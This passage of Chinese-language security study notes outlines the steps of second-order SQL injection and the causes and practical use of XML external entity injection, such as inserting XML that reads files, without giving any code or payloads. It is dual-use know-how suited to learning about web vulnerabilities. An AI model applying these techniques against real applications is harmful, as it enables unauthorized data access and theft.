  * 用于将恶意输入保存在数据库中。
  * 攻击者提交第二个HTTP请求
  * 为处理第二个HTTP请求，应用检索存储在后端数据库中的恶意输入，动态构建SQL语句。
  * 如果攻击实现，在第二个请求的响应中向攻击者返回结果。


### 【XML实体注入漏洞】

* **形成原因**
  * 一般为代码注入
  * 代码过滤不严
  * 用户可控

* **实战**
  * 用户信息可能以xml形式保存
  * 通过插入一些xml文件读取代码

